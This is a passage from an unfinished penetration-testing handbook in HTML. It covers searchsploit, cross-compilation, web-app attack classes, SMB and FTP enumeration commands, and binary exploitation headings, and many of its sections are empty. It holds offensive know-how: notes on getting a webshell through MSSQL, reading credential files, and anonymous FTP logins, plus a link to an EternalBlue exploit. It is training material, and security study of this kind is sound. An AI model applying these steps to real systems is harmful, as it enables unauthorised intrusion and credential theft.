<p>In an ideal world, we would research every vulnerability ourselves and write exploits from scratch. But we don&#8217;t; most of us have neither the time nor inclination to learn the nuances of every single service stack top to bottom (although we should try!).</p>
</div>
<div class="paragraph">
<p>Most exploits can be recreated by skimming vulnerability details &amp; PoC code (assisted by very helpful libraries like <code>pwntools</code> and <code>scapy</code>) which should be done where feasible.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="sect2">
<h3 id="_searchsploit">searchsploit</h3>
<div class="paragraph">
<p><code>searchsploit</code> is a utility provided by Exploit Database that caches the Exploit Database archive (exploits, shellcode &amp; papers) locally for searching and application. We can search for exploits, or perform operations on exploits (e.g. copying them, examining) using their EDB-ID.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">searchsploit &lt;TERMS&gt;</span></code></pre>
</div>
</div>
<table class="tableblock frame-all grid-all stretch">
<colgroup>
<col style="width: 50%;">
<col style="width: 50%;">
</colgroup>
<tbody>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><strong>Switch</strong></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock"><strong>Description</strong></p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>-e</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Performs an exact match with the exploit title.</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>-j</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Display results in JSON format.</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>-m &lt;EDB-ID&gt;</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Mirror (copy) an exploit to the current working directory.</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>-u</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Install any exploitdb package updates.</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock"><code>-x &lt;EDB-ID&gt;</code></p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Examine an exploit.</p></td>
</tr>
</tbody>
</table>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="gp">root@Guest:~#</span><span class="w"> </span>searchsploit WordPress Plugin Shop
<span class="go">------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
WordPress Plugin eShop 6.2.8 - Multiple Cross-Site Scripting Vulnerabilities        | php/webapps/36038.txt
WordPress Plugin Shopp - Multiple Vulnerabilities                                   | php/webapps/37934.txt
WordPress Plugin Shopping Cart 3.0.4 - Unrestricted Arbitrary File Upload           | php/webapps/35730.html
</span><span class="c">...</span></code></pre>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_cross_compilation">Cross Compilation</h3>
<div class="paragraph">
<p>Ideally, we would be on a native system to compile code targeting it, but this is not always feasible. Outside of having virtual machines or provisioning cloud images, we have the option of cross compilation toolchains.</p>
</div>
<div class="sect3">
<h4 id="_mingw_w64">mingw-w64</h4>
<div class="paragraph">
<p><code>mingw-w64</code> (Minimalistic GNU Windows) is a port of GCC and supporting elements (Binutils, GDB, &#8230;&#8203;) to a Windows environment - which allow the creation of Windows PE binaries using the GCC toolchain.</p>
</div>
<div class="paragraph">
<p>It also allows us to target both 32 and 64 bit Windows platforms from a Linux host.</p>
</div>
<div class="paragraph">
<p>For C compilation:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="go">i686-w64-mingw32-gcc file.c -o 32.exe
x86_64-w64-mingw32-gcc file.c -o 64.exe</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>For C++ compilation:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="go">i686-w64-mingw32-g++ file.cc -o 32.exe
x86_64-w64-mingw32-g++ file.cc -o 64.exe</span></code></pre>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_putting_it_together_modifying_out_of_the_box_exploits">Putting it Together: Modifying Out-of-the-Box Exploits</h2>
<div class="sectionbody">
<div class="paragraph">
<p>TODO:</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_attacking_web_applications">Attacking Web Applications</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Often the largest attack surfaces available to us (especially on public-facing systems) are web applications. We can usually chain otherwise deadend vulnerabilities into code execution. For example, a vulnerability in a web hosted CMS that allows arbitrary HTTP requests to be made in the name of the web server (SSRF) could be abused to send commands to an insecure backend redis instance - thereby resulting in RCE.</p>
</div>
<div class="paragraph">
<p>Having a strong understanding of modern web stacks and associated technologies (at the very least â fluency) is critical to expanding our potential exploit vectors â it allows us to read proprietary code, craft payloads and find creative ways to chain and exploit vulnerabilities.</p>
</div>
<div class="sect2">
<h3 id="_web_app_recon">Web App Recon</h3>
<div class="paragraph">
<p>As always, the first step to attacking a web application is gathering information. There are a number of common checks that we usually perform regardless of the tech &amp; stack but more sophisticated techniques will require a deeper understanding of the many, many, many technologies employed in serving wep apps.</p>
</div>
</div>
<div class="sect2">
<h3 id="_interesting_files">Interesting Files</h3>
<div class="paragraph">
<p>As a first step, we should check for the existence of common files - this is often stack dependent (e.g. a <code>phpinfo()</code> page for PHP applications) but there are two that are often universal: <code>robots.txt</code> and <code>sitemap.xml</code>.</p>
</div>
<div class="sect3">
<h4 id="_robots_txt">robots.txt</h4>
<div class="paragraph">
<p>The <code>robots.txt</code> file is known as the robots exclusion standard and is a file that can be uploaded to the root directory of a web server for "polite" web crawlers to obey (for instance, Google&#8217;s many search indexing robots). They specify which directories are "allowed" and which are "disallowed" - we are often interested in directories that the site authors have explicitly denied crawlers access to - often admin portals or similar.</p>
</div>
</div>
<div class="sect3">
<h4 id="_sitemap_xml">sitemap.xml</h4>
<div class="paragraph">
<p>Like the <code>robots.txt</code> file, the sitemap file informs web crawlers of the structure of the website. Good to have as a starting point for bruteforcing directories.</p>
</div>
</div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_scanners">Scanners</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Web scanners allow us to quickly check for low hanging fruit - like Heartbleed or Shellshock. They also help fingerprint the underlying technologies and thereby assist in manual exploitation.</p>
</div>
<div class="sect2">
<h3 id="_nikto">nikto</h3>
<div class="paragraph">
<p><code>nikto</code> is a comprehensive web app scanner that is regularly updated and covers misconfigurations, dangerous files, common vulnerabilities and outdated software.</p>
</div>
<div class="paragraph">
<p>It does however take quite a long time to run to completion. Like with service scanning, we should manually probe the web app while scanning.</p>
</div>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p><code>nikto</code> is a <strong>very noisy tool</strong> - it generates a large number of requests to the web server, which could easily set off countermeasures.</p>
</div>
</td>
</tr>
</table>
</div>
</div>
<div class="sect2">
<h3 id="_whatweb">Whatweb</h3>

</div>
<div class="sect2">
<h3 id="_nse">NSE</h3>

</div>
<div class="sect2">
<h3 id="_cms_scanners">CMS Scanners</h3>
<div class="paragraph">
<p>clusterd
vulnx
droopscan
wpscan
joomscan
vulnx
=== Dirbusting</p>
</div>
<div class="ulist">
<ul>
<li>
<p>Cadaver</p>
</li>
</ul>
</div>
</div>
<div class="sect2">
<h3 id="_sql_injections">SQL Injections</h3>
<div class="admonitionblock tip">
<table>
<tr>
<td class="icon">
<i class="fa icon-tip" title="Security Pattern"></i>
</td>
<td class="content">
<div class="paragraph">
<p>SQLi is a subset of attacks in which systems mix control sequences with user input. Exploiting these vulnerabilities is a case of finding a way to escape the user input âcontainerâ (usually with some constraints on character encoding and blacklists/whitelists) after which we are free to do naughty things.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>SQL injection covers sending malicious input to a frontend for a database such that we "inject" SQL syntax into the query that is executed.</p>
</div>
<div class="paragraph">
<p>Steps &#8594; enumerate info schema &#8594; Enumerate current db &#8594; enumerate other databases &#8594; see if we can get code execution</p>
</div>
<div class="sect3">
<h4 id="_mysql_mariadb">MySQL / MariaDB</h4>

</div>
<div class="sect3">
<h4 id="_mssql">MSSQL</h4>
<div class="ulist">
<ul>
<li>
<p>xpcmdshell</p>
</li>
<li>
<p><a href="https://www.mssqltips.com/sqlservertip/2014/replace-xpcmdshell-command-line-use-with-sql-server-agent/" class="bare">https://www.mssqltips.com/sqlservertip/2014/replace-xpcmdshell-command-line-use-with-sql-server-agent/</a></p>
</li>
<li>
<p>file write (csv, dumpfile&#8230;&#8203; ) into webshell &#8230;&#8203;</p>
</li>
<li>
<p>pull hashes and crack</p>
</li>
<li>
<p>load in and read sensitive files (unattend, configs &#8230;&#8203; )</p>
</li>
</ul>
</div>
<div class="paragraph">
<p>sa user privs - need to check distribution of mssql privs
==== NoSQL
<a href="https://nullsweep.com/a-nosql-injection-primer-with-mongo/" class="bare">https://nullsweep.com/a-nosql-injection-primer-with-mongo/</a>
<a href="https://security.stackexchange.com/questions/83231/mongodb-nosql-injection-in-python-code" class="bare">https://security.stackexchange.com/questions/83231/mongodb-nosql-injection-in-python-code</a>
<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection" class="bare">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection</a></p>
</div>
<div class="paragraph">
<p>(Mongo DB - Native Helper)
<a href="https://www.exploit-db.com/exploits/24947" class="bare">https://www.exploit-db.com/exploits/24947</a>
NoSQL is getting more and more common.
==== H2DB
<a href="https://www.exploit-db.com/exploits/49384" class="bare">https://www.exploit-db.com/exploits/49384</a>
<a href="https://codewhitesec.blogspot.com/2019/08/exploit-h2-database-native-libraries-jni.html" class="bare">https://codewhitesec.blogspot.com/2019/08/exploit-h2-database-native-libraries-jni.html</a>
either that or CREATE alias if javac is available.</p>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_xss">XSS</h3>
<div class="paragraph">
<p>Stored &#8230;&#8203;
Usually targetting clients &#8594; assist social eng campaign
On weak apps (usually proprietary) can get interesting execution &#8594; add admin &#8594; &#8230;&#8203;
Exploitation of old browsers &#8230;&#8203;</p>
</div>
</div>
<div class="sect2">
<h3 id="_lfirfi">LFI/RFI</h3>
<div class="paragraph">
<p>The PHP language features an include expression (as well as a require) that evaluates a specified file - usually used to load libraries or supporting code. If we can gain partial or full control of the included file path, we can abuse this inclusion to read local files or potentially execute arbitrary php code. This is referred to as <strong>Local File Inclusion</strong>.</p>
</div>
<div class="paragraph">
<p>If the <em>allow_url_include</em> runtime option is enabled, this vulnerability can be extended to <strong>Remote File Inclusion</strong> - allowing an attacker to serve PHP code to be executed by the victim server.</p>
</div>
<div class="paragraph">
<p>Chaining &#8594; Upload to non web path &#8594; LFI
Reading secrets, config, (e.g. unattend) &#8594; similar to priv esc
==== LFI
PHP</p>
</div>
<div class="paragraph">
<p>web.config</p>
</div>
</div>
<div class="sect2">
<h3 id="_arbitrary_file_read">Arbitrary File Read</h3>
<div class="paragraph">
<p>common ways to escalate to shell
creds
config files
secrets â¦ (e.g. unattend)
Often methodology is similar to privesc?</p>
</div>
</div>
<div class="sect2">
<h3 id="_unrestricted_file_upload">Unrestricted File Upload</h3>
<div class="sect3">
<h4 id="_polygot_files">Polygot Files</h4>

</div>
</div>
<div class="sect2">
<h3 id="_command_injection">Command Injection</h3>

</div>
<div class="sect2">
<h3 id="_csrf">CSRF</h3>

</div>
<div class="sect2">
<h3 id="_ssti">SSTI</h3>

</div>
<div class="sect2">
<h3 id="_ssrf">SSRF</h3>

</div>
<div class="sect2">
<h3 id="_bruteforce">Bruteforce</h3>

</div>
<div class="sect2">
<h3 id="_xml_entity_injection">XML Entity Injection</h3>

</div>
<div class="sect2">
<h3 id="_idor">IDOR</h3>

</div>
<div class="sect2">
<h3 id="_clientside_exploits">Clientside Exploits</h3>
<div class="paragraph">
<p>Browser fingerprinting &#8594; Exploitation</p>
</div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_phishing">Phishing</h2>
<div class="sectionbody">
<div class="paragraph">
<p>&lt;&#8230;&#8203;&gt;
While it is almost always strictly outside of the RoE, it should be noted that developers and high level employees often have company secrets stored unhygienically on personal systems - making spearphishing attacks quite a rewarding vector for attackers.</p>
</div>
</div>
</div>
<h1 id="_privilege_escalation" class="sect0">Privilege Escalation</h1>
<div class="openblock partintro">
<div class="content">
<div class="ulist">
<ul>
<li>
<p>lolbas, gtfobin</p>
</li>
</ul>
</div>
<div class="paragraph">
<p>Living off the land mindset &#8594; native tooling</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_upgrading_our_shell">Upgrading our Shell</h2>
<div class="sectionbody">

</div>
</div>
<h1 id="_looting" class="sect0">Looting</h1>

<h1 id="_pivoting" class="sect0">Pivoting</h1>

<h1 id="_active_directory" class="sect0">Active Directory</h1>
<div class="openblock partintro">
<div class="content">
<div class="ulist">
<ul>
<li>
<p><a href="https://wadcoms.github.io/" class="bare">https://wadcoms.github.io/</a>
This will require a lot of brushing up</p>
</li>
</ul>
</div>
</div>
</div>
<h1 id="_service_cheatsheet" class="sect0">Service Cheatsheet</h1>
<div class="openblock partintro">
<div class="content">
<div class="paragraph">
<p>This section is a "cheatsheet" of sorts that will summarise the purpose of services, their common usage, frequent vulnerabilities &amp; misconfigurations as well as other fun stuff we can do as attackers. It is heavily influenced by the very excellent HackTricks resource (<a href="https://book.hacktricks.xyz/pentesting/pentesting-ftp" class="bare">https://book.hacktricks.xyz/pentesting/pentesting-ftp</a>) by Carlos Polop, developer of the xPeas privilege escalation suite as well as the various "living off the land" cheatsheets (<code>https://gtfobins.github.io/</code>, <code>https://lolbas-project.github.io/</code>, <code>https://wadcoms.github.io/</code>).</p>
</div>
<div class="admonitionblock tip">
<table>
<tr>
<td class="icon">
<i class="fa icon-tip" title="Security Pattern"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Don&#8217;t try to memorise service information from a book. A general idea of service capabilities and their privileges is sufficient - thats what reference notes are for.</p>
</div>
<div class="paragraph">
<p>We will build up an intuitive knowledge base with experience - let this section be a reference that we can pull out and consult after automated service scanning if need be.</p>
</div>
</td>
</tr>
</table>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_ftp">FTP</h2>
<div class="sectionbody">
<div class="paragraph">
<p>File Transfer Protocol (FTP) is a plain text protocol used to transfer files between machines.</p>
</div>
<div class="sect2">
<h3 id="_active_vs_passive">Active vs Passive</h3>
<div class="paragraph">
<p>Active or Passive mode dictates whether the client or server initiates the data connection to send or receive files.</p>
</div>
<div class="paragraph">
<p>In Active FTP mode, the server initiates connections to high ports on the client which may be blocked by a firewall on the client&#8217;s side. This is usually the default mode for the server. It can be invoked by sending the <code>PORT</code> command.</p>
</div>
<div class="paragraph">
<p>Passive mode on the other hand requires the client to initiate data connections to the server. Because the client handles connections (and thus dictates source ports), it is better suited for clients behind a firewall. This behaviour requires the <code>PASV</code> command to be sent.</p>
</div>
<div class="paragraph">
<p>If file transfer connections are timing out, but authentication works fine, try changing the mode.</p>
</div>
</div>
<div class="sect2">
<h3 id="_anonymous_login">Anonymous Login</h3>
<div class="paragraph">
<p>We can often authenticate as an anonymous user with the credentials <code>anonymous:anonymous</code>.</p>
</div>
</div>
<div class="sect2">
<h3 id="_file_upload">File Upload</h3>
<div class="ulist">
<ul>
<li>
<p>Chain with LFI / RFI</p>
</li>
<li>
<p>Piggyback for mundane file transfer</p>
</li>
</ul>
</div>
<div class="admonitionblock important">
<table>
<tr>
<td class="icon">
<i class="fa icon-important" title="Important"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Watch out for the transfer modes when sending binary files (or non plaintext files). Some FTP servers still support ASCII transfer mode - which will mangle the transfer of binary files (like executables &amp; data), meaning we should almost always be on binary mode to avoid corruption. This is done by sending the <code>binary</code> command before file transfer.</p>
</div>
</td>
</tr>
</table>
</div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_smb_2">SMB</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Server Message Block (SMB) is a protocol that provides shared access to resources such as files, serial devices, printers and IPC pipes. It is commonly used for file sharing on a network. By default it listens on TCP 445.</p>
</div>
<div class="sect2">
<h3 id="_recon_tools">Recon Tools</h3>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="go">smbclient -L 10.10.10.10
enum4linux -a 10.10.10.10
ridenum 10.10.10.10 500 50000
crackmapexec smb 10.10.10.10</span></code></pre>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_access_share">Access Share</h3>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"><span class="go">mount -t cifs //10.10.10.10/share/ local/ -o rw
smbclient //10.10.10.10/share</span></code></pre>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_eternal_blue">Eternal Blue</h3>
<div class="paragraph">
<p>Major exploit in SMB implementation for all major Windows versions. <a href="https://github.com/worawit/MS17-010" class="bare">https://github.com/worawit/MS17-010</a> (especially <code>zzz_exploit.py</code>) provides a good starting point for custom payloads.</p>
</div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_nbt">NBT</h2>
<div class="sectionbody">
<div class="paragraph">
<p>The NetBIOS is an API of sorts that listens on TCP 139 as well as several UDP ports. Note that SMB and NetBIOS are two separate protocols. NetBIOS is a session layer "protocol" and service that allows computers on a LAN to communicate with each other. NBT stands for NetBIOS over TCP.</p>
</div>
<div class="sect2">
<h3 id="_recon_tools_2">Recon Tools</h3>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="console"></code></pre>
</div>
</div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_ssh">SSH</h2>
<div class="sectionbody">

</div>
</div>
<div class="sect1">
<h2 id="_snmp">SNMP</h2>
<div class="sectionbody">

</div>
</div>
<div class="sect1">
<h2 id="_smtp">SMTP</h2>
<div class="sectionbody">
<div class="sect3">
<h4 id="_checklist">Checklist</h4>
<div class="ulist checklist">
<ul class="checklist">
<li>
<p><i class="fa fa-square-o"></i> Null sessions</p>
</li>
<li>
<p><i class="fa fa-square-o"></i> Shares &amp; their permissions</p>
</li>
<li>
<p><i class="fa fa-square-o"></i> Hostname &amp; NetBIOS name</p>
</li>
<li>
<p><i class="fa fa-square-o"></i> Domain information</p>
</li>
<li>
<p><i class="fa fa-square-o"></i> Domain password policy</p>
</li>
<li>
<p><i class="fa fa-square-o"></i> Domain users</p>
</li>
<li>
<p><i class="fa fa-square-o"></i> RID cycling</p>
</li>
<li>
<p><i class="fa fa-square-o"></i> Public weaponised exploits</p>
</li>
</ul>
</div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_redis">Redis</h2>
<div class="sectionbody">

</div>
</div>
<div class="sect1">
<h2 id="_erlang">Erlang</h2>
<div class="sectionbody">
<div class="ulist">
<ul>
<li>
<p>leak auth cookie (def ~/.erlang.cookie)</p>
</li>
</ul>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_web_servers">Web Servers</h2>
<div class="sectionbody">

</div>
</div>
<div class="sect1">
<h2 id="_awf">awf</h2>
<div class="sectionbody">

</div>
</div>
<h1 id="_practice_for_red_teaming" class="sect0">Practice for Red Teaming</h1>
<div class="openblock partintro">
<div class="content">
<div class="ulist">
<ul>
<li>
<p>OSCP</p>
</li>
<li>
<p>Proving Grounds</p>
</li>
<li>
<p>Hack the Box</p>
</li>
</ul>
</div>
</div>
</div>
<h1 id="_social_engineering" class="sect0">Social Engineering?</h1>
<div class="openblock partintro">
<div class="content">
<div class="quoteblock">
<blockquote>
<div class="paragraph">
<p>You cannot trust people, big deal, you CAN trust them to be self-interested, and I use that all the fucking time.</p>
</div>
</blockquote>
<div class="attribution">
&#8212; John McAfee
</div>
</div>
<div class="paragraph">
<p>Humans like to be helpful â¦
Pretexting â¦
As attackers we always consider the weakest links first â and the weakest links in most systems are often humans.</p>
</div>
</div>
</div>
<h1 id="_binary_exploitation" class="sect0">Binary Exploitation</h1>
<div class="openblock partintro">
<div class="content">
The bread and butter of hacking, binary exploitation is the art of subverting the expected behaviour of a compiled binary application. Usually this involves taking control of what the program executes, be it by manipulating the instruction pointer or by corrupting memory. With regards to C, the most well known are the buffer overflow and the format string attack.
</div>
</div>
<div class="sect1">
<h2 id="_debuggers_and_disassemblers">Debuggers and Disassemblers</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Olly, GDB, Immunity, Ghidra, Ida, x86/64, Binary Ninja &#8230;&#8203;</p>
</div>
<div class="sect2">
<h3 id="_the_og_buffer_overflow">The OG Buffer Overflow</h3>

</div>
<div class="sect2">
<h3 id="_shellcode">Shellcode</h3>

</div>
<div class="sect2">
<h3 id="_format_string_attacks">Format String Attacks</h3>

</div>
<div class="sect2">
<h3 id="_python_format_string_attacks">Python Format String Attacks</h3>

</div>
<div class="sect2">
<h3 id="_canaries_aslr_depnx_and_other_protections">Canaries, ASLR, DEP/NX and Other Protections</h3>

</div>
<div class="sect2">
<h3 id="_return_oriented_programming_rop">Return-Oriented-Programming (ROP)</h3>

</div>
<div class="sect2">
<h3 id="_exploiting_the_heap">Exploiting the Heap</h3>

</div>
<div class="sect2">
<h3 id="_use_after_free">Use After Free</h3>

</div>
<div class="sect2">
<h3 id="_x64_exploitation">x64 Exploitation</h3>

</div>
</div>
</div>
<div class="sect1">
<h2 id="_hash_cracking">Hash Cracking</h2>
<div class="sectionbody">

</div>
</div>
<div class="sect1">
<h2 id="_writing_malware">Writing Malware</h2>
<div class="sectionbody">
<div class="sect2">
<h3 id="_windows">Windows</h3>

</div>
<div class="sect2">
<h3 id="_unix">Unix</h3>

</div>
</div>
</div>
<div class="sect1">
<h2 id="_attacking_embedded_devices">Attacking Embedded Devices</h2>
<div class="sectionbody">
<div class="sect2">
<h3 id="_firmware_emulation">Firmware Emulation</h3>

</div>
<div class="sect2">
<h3 id="_jtag_and_uart">JTAG and UART</h3>

</div>
</div>
</div>
<div class="sect1">
<h2 id="_physical_attacks">Physical Attacks</h2>
<div class="sectionbody">
<div class="sect2">
<h3 id="_lockpicking">Lockpicking</h3>

</div>
</div>
</div>
<h1 id="_further_learning" class="sect0">Further Learning</h1>
<div class="openblock partintro">
<div class="content">
<div class="quoteblock">
<blockquote>
<div class="paragraph">
<p>Most hackers are young because young people tend to be adaptable. As long as you remain adaptable, you can always be a good hacker.</p>
</div>
</blockquote>
<div class="attribution">
&#8212; Eric Corley<br>
<cite>2600: The Hacker Quarterly</cite>
</div>
</div>
<div class="paragraph">
<p>Need to grab my reading list.</p>
</div>
<div class="paragraph">
<p>Learn from the best (nation state actors) (tradecraft esp)
Vault 7</p>
</div>
<div class="paragraph">
<p><a href="https://wikileaks.org/ciav7p1/cms/page_14587109.html" class="bare">https://wikileaks.org/ciav7p1/cms/page_14587109.html</a></p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_example_appendix">Appendix A: Example Appendix</h2>
<div class="sectionbody">
<div class="paragraph">
<p>One or more optional appendixes go here at section level 1.</p>
</div>
<div class="sect2">
<h3 id="_appendix_sub_section">Appendix Sub-section</h3>
<div class="paragraph">
<p>Sub-section body.</p>
</div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_bibliography">Bibliography</h2>
<div class="sectionbody">
<div class="paragraph">
<p>My personal notes (from which most of this material was written) are a mish mash of practical experience, IRC/Discord chatter, and a melting pot of books and online resources. This bibliography refers to new material I referenced while writing this book (and the odd reference I have in my notes) and does not cover everything that is "not my own" - please reach out to me if I&#8217;ve forgotten to cite you!</p>
</div>
<div class="ulist bibliography">
<ul class="bibliography">
<li>
<p><a id="smtpntlm"></a>[1] <a href="https://medium.com/swlh/internal-information-disclosure-using-hidden-ntlm-authentication-18de17675666" class="bare">https://medium.com/swlh/internal-information-disclosure-using-hidden-ntlm-authentication-18de17675666</a></p>
</li>
<li>
<p><a id="snmpoidoracle"></a>[2] <a href="https://docs.oracle.com/cd/E18752_01/html/817-3000/introduction-6.html" class="bare">https://docs.oracle.com/cd/E18752_01/html/817-3000/introduction-6.html</a></p>
</li>
<li>
<p><a id="markshellwindows"></a>[3] <a href="https://stackoverflow.com/questions/37991717/python-windows-reverse-shell-one-liner" class="bare">https://stackoverflow.com/questions/37991717/python-windows-reverse-shell-one-liner</a></p>
</li>
<li>
<p><a id="ericphelps"></a>[4] <a href="http://www.ericphelps.com/scripting/samples/" class="bare">http://www.ericphelps.com/scripting/samples/</a></p>
</li>
</ul>
</div>
</div>
</div>
</div>
<div id="footer">
<div id="footer-text">
Version 1.0<br>
Last updated 2021-04-13 00:11:22 +1000
</div>
</div>
</body>
</html>